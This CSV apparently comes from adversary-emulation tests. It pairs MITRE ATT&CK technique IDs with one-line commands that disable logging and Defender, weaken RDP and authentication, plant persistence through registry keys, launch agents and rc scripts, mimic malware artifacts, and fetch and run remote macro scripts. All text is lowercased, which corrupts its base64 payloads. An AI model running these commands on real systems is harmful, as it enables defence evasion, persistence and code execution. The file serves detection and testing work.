mitre_id,technique_name,command
T1112,Windows HideSCAVolume Group Policy Feature,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\policies\explorer"" /v hidescavolume /t reg_dword /d 1 /f"
T1112,Windows Modify Show Compress Color And Info Tip Registry,reg add hkcu\software\microsoft\windows\currentversion\explorer\advanced /v showinfotip /t reg_dword /d 0 /f reg add hkcu\software\microsoft\windows\currentversion\explorer\advanced /v showcompcolor /t reg_dword /d 0 /f
T1112,Windows Powershell Logging Disabled,reg add hkcu\software\policies\microsoft\windows\powershell\modulelogging /v enablemodulelogging /t reg_dword /d 0 /f reg add hkcu\software\policies\microsoft\windows\powershell\scriptblocklogging /v enablescriptblocklogging /t reg_dword /d 0 /f reg add hkcu\software\policies\microsoft\windows\powershell\transcription /v enabletranscripting /t reg_dword /d 0 /f reg add hkcu\software\policies\microsoft\windows\powershell /v enablescripts /t reg_dword /d 0 /f reg delete hkcu\software\policies\microsoft\windows\powershell /v enablescripts /f >nul 2>&1
T1112,Windows Add Registry Value to Load Service in Safe Mode without Network,"reg add ""hklm\system\currentcontrolset\control\safeboot\minimal\atomicsafemode"" /ve /t reg_sz /f /d ""service"""
T1112,Windows Add Registry Value to Load Service in Safe Mode with Network,"reg add ""hklm\system\currentcontrolset\control\safeboot\network\atomicsafemode"" /ve /t reg_sz /f /d ""service"""
T1112,Disable Windows Toast Notifications,reg add hkey_current_user\software\microsoft\windows\currentversion\pushnotifications /v toastenabled /t reg_dword /d 0 /f
T1112,Disable Windows Security Center Notifications,reg add hklm\software\wow6432node\microsoft\windows\currentversion\immersiveshell /v useactioncenterexperience /t reg_dword /d 0 /f
T1112,Suppress Win Defender Notifications,"reg add ""hklm\software\policies\microsoft\windows defender\ux configuration"" /v notification_suppress /t reg_dword /d 1 /f"
T1112,Allow RDP Remote Assistance Feature,"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fallowtogethelp /t reg_dword /d 1 /f"
T1112,NetWire RAT Registry Key Creation,"reg add hkcu\software\microsoft\windows\currentversion\run /v netwire /t reg_sz /d ""c:\users\admin\appdata\roaming\install\host.exe"" /f reg add hkcu\software\netwire /v hostid /t reg_sz /d hostid-kai6ci /f reg add hkcu\software\netwire /v ""install date"" /t reg_sz /d ""2021-08-30 07:17:27"" /f"
T1112,Ursnif Malware Registry Key Creation,reg add hkcu\software\appdatalow\software\microsoft\3a861d62-51e0-15700f2219a4 /v comsxres /t reg_binary /d 72656463616e617279 /f
T1112,Terminal Server Client Connection History Cleared,"reg delete ""hkey_current_user\software\microsoft\terminal server client\default"" /va /f reg delete ""hkey_current_user\software\microsoft\terminal server client\servers"" /f"
T1112,Disable Windows Error Reporting Settings,reg add hklm64\software\policies\microsoft\windows defender\reporting /v disableenhancednotifications /t reg_dword /d 1 /f reg add hklm\software\policies\microsoft\windows defender\reporting /v disableenhancednotifications /t reg_dword /d 1 /f
T1112,DisallowRun Execution Of Certain Applications,"reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer /v disallowrun /t reg_dword /d 1 /f reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowrun /f /t reg_sz /v art1 /d ""regedit.exe"" reg add hkey_current_user\software\microsoft\windows\currentversion\policies\explorer\disallowrun /f /t reg_sz /v art2 /d ""cmd.exe"""
T1112,Enabling Restricted Admin Mode via Command_Prompt,"reg add ""hklm\system\currentcontrolset\control\lsa"" /f /v disablerestrictedadmin /t reg_dword /d 0"
T1112,Mimic Ransomware - Enable Multiple User Sessions,reg add hkey_current_user\software\microsoft\windows\currentversion\winlogon /t reg_dword /v allowmultipletssessions /d 1 /f
T1112,Mimic Ransomware - Allow Multiple RDP Sessions per User,"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fsinglesessionperuser /t reg_dword /d 0 /f"
T1112,Event Viewer Registry Modification - Redirection URL,"reg add ""hklm\software\microsoft\windows nt\currentversion\event viewer"" /v microsoftredirectionurl /t reg_sz /d ""#{redirection_url}"" /f"
T1112,Event Viewer Registry Modification - Redirection Program,"reg add ""hklm\software\microsoft\windows nt\currentversion\event viewer"" /v microsoftredirectionprogram /t reg_expand_sz /d ""#{redirection_program}"" /f"
T1112,Enabling Remote Desktop Protocol via Remote Registry,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v securitylayer /t reg_dword /d 0 /f"
T1112,Disable Win Defender Notification,"reg add ""hklm\software\policies\microsoft\windows defender security center\notifications"" /v ""disablenotifications"" /t reg_dword /d 1 /f"
T1112,Disable Windows OS Auto Update,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate\au"" /v ""noautoupdate"" /t reg_dword /d 1 /f"
T1112,Disable Windows Auto Reboot for current logon user,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate\au"" /v ""noautorebootwithloggedonusers"" /t reg_dword /d 1 /f"
T1112,Windows Auto Update Option to Notify before download,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate\au"" /v ""auoptions"" /t reg_dword /d 2 /f"
T1112,Do Not Connect To Win Update,"reg add ""hklm\software\policies\microsoft\windows\windowsupdate"" /v ""donotconnecttowindowsupdateinternetlocations"" /t reg_dword /d 1 /f"
T1112,Tamper Win Defender Protection,"reg add ""hklm\software\microsoft\windows defender\features"" /v ""tamperprotection"" /t reg_dword /d 0 /f"
T1112,Snake Malware Registry Blob,"$typicalpath = ""hklm:\software\classes\.wav\openwithprogids""; $randombytes = new-object byte[] 0x1000; (new-object random).nextbytes($randombytes); new-itemproperty -path $typicalpath -name ""atomicsnake"" -value $randombytes -propertytype binary -force | out-null"
T1112,Allow Simultaneous Download Registry,"reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v ""maxconnectionsperserver"" /t reg_dword /d 10 /f reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v ""maxconnectionsper1_0server"" /t reg_dword /d 10 /f"
T1112,Modify Internet Zone Protocol Defaults in Current User Registry - cmd,"reg add ""hkey_current_user\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults"" /v http /t reg_dword /d 0 /f reg add ""hkey_current_user\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults"" /v https /t reg_dword /d 0 /f"
T1112,Modify Internet Zone Protocol Defaults in Current User Registry - PowerShell,# set the registry values for http and https to 0 set-itemproperty -path 'hkcu:\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults' -name 'http' -value 0 set-itemproperty -path 'hkcu:\software\microsoft\windows\currentversion\internet settings\zonemap\protocoldefaults' -name 'https' -value 0
T1112,Activities To Disable Secondary Authentication Detected By Modified Registry Value.,"reg add ""hklm\software\policies\microsoft\secondaryauthenticationfactor"" /v ""allowsecondaryauthenticationdevice"" /t reg_dword /d 0 /f"
T1112,Activities To Disable Microsoft [FIDO Aka Fast IDentity Online] Authentication Detected By Modified Registry Value.,"reg add ""hklm\software\policies\microsoft\fido"" /v ""allowexternaldevicesignon"" /t reg_dword /d 0 /f"
T1112,Scarab Ransomware Defense Evasion Activities,"reg add ""hklm\software\microsoft\windows\currentversion\policies\system\credssp\parameters"" /v allowencryptionoracle /t reg_dword /d 2 /f"
T1112,Disable Remote Desktop Anti-Alias Setting Through Registry,"reg add ""hkey_local_machine\software\policies\microsoft\windows nt\terminal services"" /v ""disableremotedesktopantialias"" /t reg_dword /d 1 /f"
T1112,Disable Remote Desktop Security Settings Through Registry,"reg add ""hkey_local_machine\software\policies\microsoft\windows nt\terminal services"" /v ""disablesecuritysettings"" /t reg_dword /d 1 /f"
T1112,Disabling ShowUI Settings of Windows Error Reporting (WER),"reg add ""hkcu\software\microsoft\windows\windows error reporting"" /v dontshowui /t reg_dword /d 1 /f"
T1112,Enable Proxy Settings,"reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v proxyenable /t reg_dword /d 1 /f"
T1112,Set-Up Proxy Server,"reg add ""hkcu\software\microsoft\windows\currentversion\internet settings"" /v proxyserver /t reg_sz /d ""proxy.atomic-test.com:8080"" /f"
T1112,RDP Authentication Level Override,"reg add ""hkcu\software\microsoft\terminal server client"" /v authenticationleveloverride /t reg_dword /d 0 /f"
T1112,Enable RDP via Registry (fDenyTSConnections),"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 0 /f"
T1112,Disable Windows Prefetch Through Registry,"reg add ""hklm\system\currentcontrolset\control\session manager\memory management\prefetchparameters"" /v ""enableprefetcher"" /t reg_dword /d 0 /f"
T1112,Setting Shadow key in Registry for RDP Shadowing,"$s= new-cimsession -computername #{server_name} -sessionoption (new-cimsessionoption -protocol dcom) get-ciminstance -namespace root\standardcimv2 -classname msft_netfirewallrule -filter 'displayname=""remote desktop - shadow (tcp-in)""' -cimsession $s | invoke-cimmethod -methodname enable invoke-cimmethod -classname stdregprov -methodname setdwordvalue -arguments @{hdefkey=[uint32]2147483650; ssubkeyname=""software\policies\microsoft\windows nt\terminal services""; svaluename=""shadow""; uvalue=[uint32]2} -cimsession $s"
T1112,Flush Shimcache,"rundll32.exe apphelp.dll,shimflushcache"
T1112,Disable Windows Remote Desktop Protocol,"reg add ""hklm\system\currentcontrolset\control\terminal server"" /v fdenytsconnections /t reg_dword /d 1 /f"
T1112,Enforce Smart Card Authentication Through Registry,"reg add ""hklm\software\microsoft\windows\currentversion\policies\system"" /v scforceoption /t reg_dword /d 1 /f"
T1112,Requires the BitLocker PIN for Pre-boot authentication,"reg add ""hklm\software\policies\microsoft\fve"" /v useadvancedstartup /t reg_dword /d 1 /f"
T1112,Modify EnableBDEWithNoTPM Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v enablebdewithnotpm /t reg_dword /d 1 /f"
T1112,Modify UseTPM Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpm /t reg_dword /d 2 /f"
T1112,Modify UseTPMPIN Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpmpin /t reg_dword /d 2 /f"
T1112,Modify UseTPMKey Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpmkey /t reg_dword /d 2 /f"
T1112,Modify UseTPMKeyPIN Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usetpmkeypin /t reg_dword /d 2 /f"
T1112,Modify EnableNonTPM Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v enablenontpm /t reg_dword /d 1 /f"
T1112,Modify UsePartialEncryptionKey Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usepartialencryptionkey /t reg_dword /d 2 /f"
T1112,Modify UsePIN Registry entry,"reg add ""hklm\software\policies\microsoft\fve"" /v usepin /t reg_dword /d 2 /f"
T1112,Abusing Windows TelemetryController Registry Key for Persistence,"reg add ""hklm\software\microsoft\windows nt\currentversion\appcompatflags\telemetrycontroller\#{new_key}"" /t reg_sz /v command /d #{new_executable} /f"
T1112,Modify RDP-Tcp Initial Program Registry Entry,"reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v finheritinitialprogram /t reg_dword /d 1 /f reg add ""hklm\system\currentcontrolset\control\terminal server\winstations\rdp-tcp"" /v initialprogram /t reg_sz /d ""c:\windows\system32\notepad.exe"" /f"
T1112,Abusing MyComputer Disk Cleanup Path for Persistence,"reg add ""hklm\software\microsoft\windows\currentversion\explorer\mycomputer\cleanuppath"" /t reg_expand_sz /d ""%systemroot%\system32\notepad.exe"" /f"
T1112,Abusing MyComputer Disk Fragmentation Path for Persistence,"reg add ""hklm\software\microsoft\windows\currentversion\explorer\mycomputer\defragpath"" /t reg_expand_sz /d ""%systemroot%\system32\notepad.exe"" /f"
T1112,Abusing MyComputer Disk Backup Path for Persistence,"reg add ""hklm\software\microsoft\windows\currentversion\explorer\mycomputer\backuppath"" /t reg_expand_sz /d ""%systemroot%\system32\notepad.exe"" /f"
T1112,Adding custom paths for application execution,"reg add ""hkey_local_machine\software\microsoft\windows\currentversion\app paths\#{app_name}"" /t reg_sz /d #{new_path} /f"
T1098,Modify SSH Authorized Keys,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;"
T1543,Launch Agent,if [ ! -d ~/library/launchagents ]; then mkdir ~/library/launchagents; fi; sudo cp #{path_malicious_plist} ~/library/launchagents/#{plist_filename} sudo launchctl load -w ~/library/launchagents/#{plist_filename}
T1543,Event Monitor Daemon Persistence,sudo cp #{script_location} #{script_destination} sudo touch /private/var/db/emondclients/#{empty_file}
T1543,Launch Agent - Root Directory,sudo cp #{path_malicious_plist} /library/launchagents/#{plist_filename} launchctl load -w /library/launchagents/#{plist_filename}
T1547,Modify HKLM:\System\CurrentControlSet\Control\Lsa Security Support Provider configuration in registry,"$oldvalue = $(get-itemproperty hklm:\system\currentcontrolset\control\lsa -name 'security packages' | select-object -expandproperty 'security packages'); set-itemproperty -path ""hklm:\system\currentcontrolset\control\lsa"" -name 'security packages old' -value ""$oldvalue""; $newvalue = ""atomictest.dll""; set-itemproperty hklm:\system\currentcontrolset\control\lsa -name 'security packages' -value $newvalue"
T1547,Modify HKLM:\System\CurrentControlSet\Control\Lsa\OSConfig Security Support Provider configuration in registry,"$oldvalue = $(get-itemproperty hklm:\system\currentcontrolset\control\lsa\osconfig -name 'security packages' | select-object -expandproperty 'security packages'); set-itemproperty -path ""hklm:\system\currentcontrolset\control\lsa\osconfig"" -name 'security packages old' -value ""$oldvalue""; $newvalue = ""atomictest.dll""; set-itemproperty hklm:\system\currentcontrolset\control\lsa\osconfig -name 'security packages' -value $newvalue"
T1037,rc.common,"sudo echo osascript -e 'tell app ""finder"" to display dialog ""hello world""' >> /etc/rc.common"
T1037,rc.common,"filename='/etc/rc.common';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.common.original;fi printf '%s\n' '#!/bin/bash' | sudo tee /etc/rc.common echo ""python3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmuy29tbw9uid4gl3rtcc9umtazny4wmdqucmmuy29tbw9ujykk'))\"""" | sudo tee -a /etc/rc.common printf '%s\n' 'exit 0' | sudo tee -a /etc/rc.common sudo chmod +x /etc/rc.common"
T1037,rc.local,"filename='/etc/rc.local';if [ ! -f $filename ];then sudo touch $filename;else sudo cp $filename /etc/rc.local.original;fi [ ""$(uname)"" = 'freebsd' ] && alias python3=python3.9 && printf '#\!/usr/local/bin/bash' | sudo tee /etc/rc.local || printf '#!/bin/bash' | sudo tee /etc/rc.local echo ""\npython3 -c \""import os, base64;exec(base64.b64decode('aw1wb3j0ig9zcm9zlnbvcgvukcdly2hvigf0b21pyyb0zxn0igzvcibtb2rpznlpbmcgcmmubg9jywwgpiavdg1wl1qxmdm3ljawnc5yyy5sb2nhbccpcgo='))\"""" | sudo tee -a /etc/rc.local printf 'exit 0' | sudo tee -a /etc/rc.local sudo chmod +x /etc/rc.local"
T1204,OSTap Style Macro Execution,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n shell`$ `""cscript.exe #{jse_path}`""`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1204,OSTap Payload Download,"echo var url = ""#{file_url}"", fso = wscript.createobject('scripting.filesystemobject'), request, stream; request = wscript.createobject('msxml2.serverxmlhttp'); request.open('get', url, false); request.send(); if (request.status === 200) {stream = wscript.createobject('adodb.stream'); stream.open(); stream.type = 1; stream.write(request.responsebody); stream.position = 0; stream.savetofile('ostapout.txt', 1); stream.close();} else {wscript.quit(1);}wscript.quit(0); > #{script_file} cscript //e:jscript #{script_file}"
T1204,Maldoc choice flags command execution,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" a = shell(`""cmd.exe /c choice /c y /n /d y /t 3`"", vbnormalfocus)"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1204,OSTAP JS version,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{jse_path}`"" for output as #1`n write #1, `""wscript.quit`""`n close #1`n a = shell(`""cmd.exe /c wscript.exe //e:jscript #{jse_path}`"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct ""#{ms_product}"""
T1204,Office launching .bat file from AppData,"[net.servicepointmanager]::securityprotocol = [net.securityprotocoltype]::tls12 iex (iwr ""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/t1204.002/src/invoke-maldoc.ps1"" -usebasicparsing) $macrocode = "" open `""#{bat_path}`"" for output as #1`n write #1, `""calc.exe`""`n close #1`n a = shell(`""cmd.exe /c #{bat_path} `"", vbnormalfocus)`n"" invoke-maldoc -macrocode $macrocode -officeproduct #{ms_product}"
